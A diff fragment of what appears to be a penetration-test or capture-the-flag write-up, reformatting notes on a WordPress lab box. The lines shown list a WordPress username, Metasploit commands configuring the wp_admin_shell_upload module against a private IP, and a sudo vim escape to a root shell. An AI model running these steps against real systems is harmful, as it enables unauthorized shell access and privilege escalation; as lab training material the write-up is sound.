@@ -547,8 +547,8 @@ Interesting Finding(s):
 [+] Elapsed time: 00:01:49
 ```
 
-Wordpress Version: 5.1.1
-Wordpress User: **shelter**
+* Wordpress Version: **5.1.1**
+* Wordpress User: **shelter**
 
 ## SMB Analysis
 
@@ -785,7 +785,6 @@ msf6 exploit(unix/webapp/wp_admin_shell_upload) > set PASSWORD password
 msf6 exploit(unix/webapp/wp_admin_shell_upload) > set USERNAME shelter
 msf6 exploit(unix/webapp/wp_admin_shell_upload) > set TARGETURI /wordpress
 msf6 exploit(unix/webapp/wp_admin_shell_upload) > set RHOSTS 192.168.1.166
-msf6 exploit(unix/webapp/wp_admin_shell_upload) > set WPCHECK false
 
 msf6 exploit(unix/webapp/wp_admin_shell_upload) > show options
 Module options (exploit/unix/webapp/wp_admin_shell_upload):
@@ -886,7 +885,7 @@ Usuário fiap pode executar os seguintes comandos em nac:
     (root) NOPASSWD: /usr/bin/vim
 ```
 
-Using GTFOBins (https://gtfobins.github.io/gtfobins/vim/#sudo)
+Using **GTFOBins** (https://gtfobins.github.io/gtfobins/vim/#sudo)
 ```
 fiap@nac:$ sudo vim -c ':!/bin/sh'
 
